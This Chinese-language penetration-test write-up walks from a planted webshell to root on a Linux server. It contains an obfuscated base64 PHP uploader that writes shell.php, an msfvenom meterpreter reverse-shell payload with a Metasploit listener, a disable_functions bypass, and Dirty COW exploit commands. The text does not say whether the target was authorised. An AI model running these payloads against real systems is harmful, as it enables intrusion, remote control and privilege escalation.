### 一、前言
在一次综合渗透测试中，我经历了一个相对完整的渗透流程。在此过程中，我使用了许多现学的技巧。此次渗透的基础是队友已经在服务器上植入了一句话木马，但无法执行系统命令。

### 二、渗透过程

#### 1. 初始上传
首先，为了方便后续操作，我决定上传一个更大的后门（“大马”）。为此，我在服务器上写入了一个简单的文件上传脚本：
```php
?a=fputs(fopen(base64_decode(c2hlbGwucGhw),w),base64_decode(base64_decode(UEQ5d2FIQWdEUXBBSkhSbGJYQWdQU0FrWDBaSlRFVlRXeWQxY0d4dllXUmZabWxzWlNkZFd5ZDBiWEJmYm1GdFpTZGRPdzBLUUNSbWFXeGxJRDBnWW1GelpXNWhiV1VvSkY5R1NVeEZVMXNuZFhCc2IyRmtYMlpwYkdVblhWc25ibUZ0WlNkZEtUc05DbWxtSUNobGJYQjBlU0FvSkdacGJHVXBLWHNOQ21WamFHOGdJanhtYjNKdElHRmpkR2x2YmlBOUlDY25JRzFsZEdodlpDQTlJQ2RRVDFOVUp5QkZUa05VV1ZCRlBTZHRkV3gwYVhCaGNuUXZabTl5YlMxa1lYUmhKejVjYmlJN1pXTm9ieUFpVEc5allXd2dabWxzWlRvZ1BHbHVjSFYwSUhSNWNHVWdQU0FuWm1sc1pTY2dibUZ0WlNBOUlDZDFjR3h2WVdSZlptbHNaU2MrWEc0aU8yVmphRzhnSWp4cGJuQjFkQ0IwZVhCbElEMGdKM04xWW0xcGRDY2dkbUZzZFdVZ1BTQW5WWEJzYjJGa0p6NWNiaUk3WldOb2J5QWlQQzltYjNKdFBseHVQSEJ5WlQ1Y2JseHVQQzl3Y21VK0lqdDlaV3h6WlNCN2FXWW9iVzkyWlY5MWNHeHZZV1JsWkY5bWFXeGxLQ1IwWlcxd0xDUm1hV3hsS1NsN1pXTm9ieUFpUm1sc1pTQjFjR3h2WVdSbFpDQnpkV05qWlhOelpuVnNiSGt1UEhBK1hHNGlPMzFsYkhObElIdGxZMmh2SUNKVmJtRmliR1VnZEc4Z2RYQnNiMkZrSUNJZ0xpQWtabWxzWlNBdUlDSXVQSEErWEc0aU8zMTlQejQ9)));
```
这个脚本将一个名为 `shell.php` 的文件上传到服务器。通过 `shell.php`，我又上传了一个常用的后门文件 `297.php`。然而，我发现无法执行系统命令（无回显）。

#### 2. 绕过禁用函数
查看 `phpinfo()` 发现是由于 `disable_function()` 导致的。随后，我使用了 GitHub 上的一个绕过方法：[bypass_disablefunc_via_LD_PRELOAD](https://github.com/zhinaonet/bypass_disablefunc_via_LD_PRELOAD)。成功执行了系统命令。

#### 3. 提权
能够执行命令后，我开始尝试提权。首先，我在 Kali 虚拟机中使用 `ngrok` 进行内网穿透，并启动 Metasploit 控制台：
```bash
msfconsole
msfvenom -l payloads
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=ip LPORT=10017 -f elf > shell.elf
```
生成反弹 Shell 后，设置监听：
```bash
use exploit/multi/handler
set PAYLOAD linux/x64/meterpreter_reverse_tcp
set LHOST 192.168.1.170
set LPORT 4444
run
```
将生成的 `shell.elf` 文件上传到服务器，并使用绕过方法赋予执行权限后运行。成功反弹 Shell。

#### 4. 使用脏牛漏洞
获取反弹 Shell 后，我查看了内核版本，发现其在脏牛漏洞的影响范围内。从 GitHub 下载了脏牛的 Exploit 源码：[dirtycow](https://github.com/FireFart/dirtycow) 并上传到服务器，编译并执行：
```bash
gcc -pthread dirty.c -o dirty -lcrypt
./dirty
```
执行成功后，在尝试切换用户时遇到了问题：
```
Standard in must be a tty
```
通过查询，我发现可以使用 Python 绕过这个问题：
```bash
python -c 'import pty; pty.spawn("/bin/sh")'
su firefart
```
输入密码后，成功提权至 root 权限。

### 三、总结
这次渗透测试并没有特别难的难点，主要是队友已经为我打下了良好的基础。作为初学者，我主要依靠网络上的资源和工具完成了此次渗透。尽管如此，我的技术水平还有待提高，需要继续学习和实践。